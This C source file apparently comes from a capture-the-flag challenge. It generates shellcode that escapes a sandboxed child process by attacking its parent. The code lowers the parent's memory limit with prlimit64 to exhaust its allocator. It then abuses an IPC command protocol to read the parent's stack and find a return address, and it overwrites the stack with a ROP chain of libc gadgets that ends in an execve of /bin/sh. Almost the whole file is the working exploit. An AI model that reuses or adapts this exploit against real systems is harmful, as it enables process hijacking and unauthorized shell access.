#include <stdio.h>
// #include <sys/resource.h>
// RLIMIT_AS

#define STRINGIFY(x) #x
#define TOSTRING(x) STRINGIFY(x)

#define CODE_STRING(s, dst) asm volatile(                             \
    "call _str" TOSTRING(__LINE__) "\n"                               \
                                   ".asciz \"" s "\"\n"               \
                                   "_str" TOSTRING(__LINE__) ":\n"    \
                                                             "pop %0" \
    : "=r"(dst))

#define CODE_STRING_LN(s, dst) asm volatile(                          \
    "call _str" TOSTRING(__LINE__) "\n"                               \
                                   ".asciz \"" s "\\n\"\n"            \
                                   "_str" TOSTRING(__LINE__) ":\n"    \
                                                             "pop %0" \
    : "=r"(dst))

#define DEBUG_PRINT(s)                                      \
    do                                                      \
    {                                                       \
        char *message;                                      \
        CODE_STRING(s, message);                            \
        my_write(1, message, sizeof(s) / sizeof(s[0]) - 1); \
    } while (0);

#define DEBUG_PRINTLN(s)                                \
    do                                                  \
    {                                                   \
        char *message;                                  \
        CODE_STRING_LN(s, message);                     \
        my_write(1, message, sizeof(s) / sizeof(s[0])); \
    } while (0);

struct my_rlimit
{
    unsigned long long rlim_cur; /* Soft limit */
    unsigned long long rlim_max; /* Hard limit (ceiling for rlim_cur) */
};

enum Command
{
    NEW,
    SET,
    GET
};

typedef struct
{
    enum Command cmd;
    union
    {
        unsigned long long size;
        long long index;
    };
    unsigned long long value;
} request_t;

long long syscall0(int id);
long long syscall1(int id, long long _1);
long long syscall3(int id, long long _1, long long _2, long long _3);
long long syscall4(int id, long long _1, long long _2, long long _3, long long _4);

int my_getppid();
long long my_write(int fd, char *buf, unsigned long long count);
long long my_read(int fd, char *buf, unsigned long long count);
int my_prlimit64(long long pid, int resource, const struct my_rlimit *new_limit, struct my_rlimit *old_limit);

size_t my_strlen(char *c);
void my_itoa(int num, char *str);
void my_print(char *c);
void my_print_num(int n);
void my_exit(int code);
unsigned long long my_getrip();

int send_new(unsigned long long size);
int send_set(long long where, unsigned long long value);
int send_get(long long where, unsigned long long *value);
void send_ill();

#define IPC_WRITE (4)
#define IPC_READ (5)

void shellcode()
{
    DEBUG_PRINTLN("Hello!");

    int ppid = my_getppid();
    if (ppid < 0)
    {
        DEBUG_PRINTLN("BAD PPID: ");
        my_print_num(ppid);
        my_exit(1);
    }

    DEBUG_PRINT("PPID: ");
    my_print_num(ppid);
    DEBUG_PRINTLN("");

    struct my_rlimit lim = {
        .rlim_cur = 0x1,
        .rlim_max = 0x1000000
    };

    int ret = my_prlimit64(ppid, 2, &lim, NULL);
    if (ret < 0) {
        DEBUG_PRINTLN("BAD RET: ");
        my_print_num(ret);
        my_exit(1);
    }

    int i;
    for (i = 0; i <= 2800; i++) {
        if (-1 == send_new(i)) {
            break;
        }
    }

    if(i > 2800) {
        DEBUG_PRINTLN("Couldnt exhaust parent malloc!");
        my_exit(1);
    }

    lim.rlim_cur = 0x1000000;
    lim.rlim_max = 0x1000000;

    ret = my_prlimit64(ppid, 2, &lim, NULL);
    if (ret < 0) {
        DEBUG_PRINTLN("BAD RET: ");
        my_print_num(ret);
        my_exit(1);
    }
    
    unsigned long long binary_base = my_getrip() & 0xfffffffffffff000;
    unsigned long long libc_base = *((unsigned long long*)binary_base);
    
    unsigned long long stack_ptr = ((unsigned long long)&ppid & 0xfffffffffffffff8);
    unsigned long long stack_leak = 0;
    unsigned long long return_to_main = binary_base + 0x1b49;

    DEBUG_PRINTLN("READING PARENT STACK...");
    
    while (1) {
        if (-1 == send_get(stack_ptr / 8, &stack_leak)) {
            DEBUG_PRINTLN("ERROR!");
            my_exit(1);
        }

        if (stack_leak == return_to_main) {
            break;
        }

        stack_ptr += 8;
    }


    DEBUG_PRINTLN("FOUND STORED RET ADDRESS");

    unsigned long long new_stack = binary_base + 0x4400;
    unsigned long long data_loc = binary_base + 0x4900;

    send_set(data_loc / 8, libc_base + 0x1b45bd); // binsh
    send_set(data_loc / 8 + 1, 0);
    
    

    send_set(stack_ptr / 8, libc_base + 0xa20f8); // pop rsp; ret
    send_set(stack_ptr / 8 + 1, new_stack);
    
    send_set(new_stack / 8, binary_base + 0x1bc3); // pop rdi; ret
    send_set(new_stack / 8 + 1, libc_base + 0x1b45bd); // binsh
    send_set(new_stack / 8 + 2, libc_base + 0x2604f); // pop rsi; ret
    send_set(new_stack / 8 + 3, data_loc);
    send_set(new_stack / 8 + 4, libc_base + 0x15f82e); // pop rdx; pop rbx; ret
    send_set(new_stack / 8 + 5, data_loc + 8);
    send_set(new_stack / 8 + 6, 0);
    send_set(new_stack / 8 + 7, libc_base + 0x47400); // pop rax; ret
    send_set(new_stack / 8 + 8, 59);
    send_set(new_stack / 8 + 9, libc_base + 0xa5686); // syscall

    DEBUG_PRINTLN("HIJACKING PARENT...");

    send_ill();

    my_exit(0);
}

// syscalls

long long syscall0(int id)
{
    long long ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        : "0"(id)
        : "rcx", "r11", "memory");
    return ret;
}

long long syscall1(int id, long long _1)
{
    long long ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        : "0"(id), "D"(_1)
        : "rcx", "r11", "memory");
    return ret;
}

long long syscall3(int id, long long _1, long long _2, long long _3)
{
    long long ret;

    asm volatile(
        "syscall"
        : "=a"(ret)
        : "0"(id), "D"(_1), "S"(_2), "d"(_3)
        : "rcx", "r11", "memory");
    return ret;
}

long long syscall4(int id, long long _1, long long _2, long long _3, long long _4)
{
    long long ret;
    register long long r10 asm("r10") = _4;

    asm volatile(
        "syscall"
        : "=a"(ret)
        : "0"(id), "D"(_1), "S"(_2), "d"(_3), "r"(r10)
        : "rcx", "r11", "memory");
    return ret;
}

// syscall wrappers

void my_exit(int code)
{
    syscall1(60, code);
}

long long my_write(int fd, char *buf, unsigned long long count)
{
    return syscall3(1, fd, (long long)buf, count);
}

long long my_read(int fd, char *buf, unsigned long long count)
{
    return syscall3(0, fd, (long long)buf, count);
}

int my_getppid()
{
    return syscall0(110);
}

int my_prlimit64(long long pid, int resource, const struct my_rlimit *new_limit, struct my_rlimit *old_limit)
{
    return syscall4(302, pid, resource, (long long)new_limit, (long long)old_limit);
}

// utils

unsigned long long my_getrip()
{
    unsigned long long ret;
    asm volatile(
        "call dummy\n"
        "dummy:\n"
        "pop %0"
        : "=r"(ret));
    return ret;
}

void my_print(char *s)
{
    my_write(1, s, my_strlen(s));
}

void my_print_num(int n)
{
    char s[32];
    my_itoa(n, s);
    my_print(s);
}

size_t my_strlen(char *s)
{
    size_t ret = 0;
    for (; *s; s++, ret++)
    {
    }
    return ret;
}

void my_itoa(int num, char *str)
{
    int i = 0;
    int isNegative = 0;

    if (num == 0)
    {
        str[i++] = '0';
        str[i] = '\0';
    }
    if (num < 0)
    {
        isNegative = 1;
        num = -num;
    }
    while (num != 0)
    {
        int rem = num % 10;
        str[i++] = rem + '0';
        num = num / 10;
    }
    if (isNegative)
        str[i++] = '-';
    str[i] = '\0';

    int start = 0;
    int end = i - 1;
    char temp;
    while (start < end)
    {
        temp = *(str + start);
        *(str + start) = *(str + end);
        *(str + end) = temp;
        start++;
        end--;
    }
}

int send_new(unsigned long long size)
{
    request_t req = {.cmd = NEW, .size = size};
    int res = 0;

    DEBUG_PRINT("NEW(");
    my_print_num(size);
    DEBUG_PRINTLN(")");

    my_write(IPC_WRITE, &req, sizeof(req));

    my_read(IPC_READ, &res, sizeof(res));

    DEBUG_PRINT("RET: ")
    my_print_num(res);
    DEBUG_PRINTLN("");

    return res;
}

int send_set(long long where, unsigned long long value)
{
    request_t req = {.cmd = SET, .index = where, .value = value};
    int res = 0;
    my_write(IPC_WRITE, &req, sizeof(req));

    DEBUG_PRINT("SET(");
    my_print_num(where);
    DEBUG_PRINT(", ")
    my_print_num(value);
    DEBUG_PRINTLN(")");

    my_read(IPC_READ, &res, sizeof(res));
    DEBUG_PRINT("RET: ")
    my_print_num(res);
    DEBUG_PRINTLN("");

    return res;
}

int send_get(long long where, unsigned long long *value)
{
    request_t req = {.cmd = GET, .index = where};
    int res = 0;
    my_write(IPC_WRITE, &req, sizeof(req));

    DEBUG_PRINT("GET(");
    my_print_num(where);
    DEBUG_PRINTLN(")");

    my_read(IPC_READ, &res, sizeof(res));
    DEBUG_PRINT("RET: ")
    my_print_num(res);
    DEBUG_PRINTLN("");

    if (res != -1)
    {
        my_read(IPC_READ, value, sizeof(unsigned long long));
    }
    return res;
}

void send_ill()
{
    request_t req = {.cmd = 0x1337};
    my_write(IPC_WRITE, &req, sizeof(req));
}

void shellcode_end()
{
}

int main()
{
    void *sc_start = &shellcode;
    void *sc_end = &shellcode_end;
    size_t sc_size = sc_end - sc_start;

    FILE *f = fopen("shellcode.bin", "wb");
    fwrite(sc_start, sc_size, 1, f);
    fclose(f);

    return 0;
}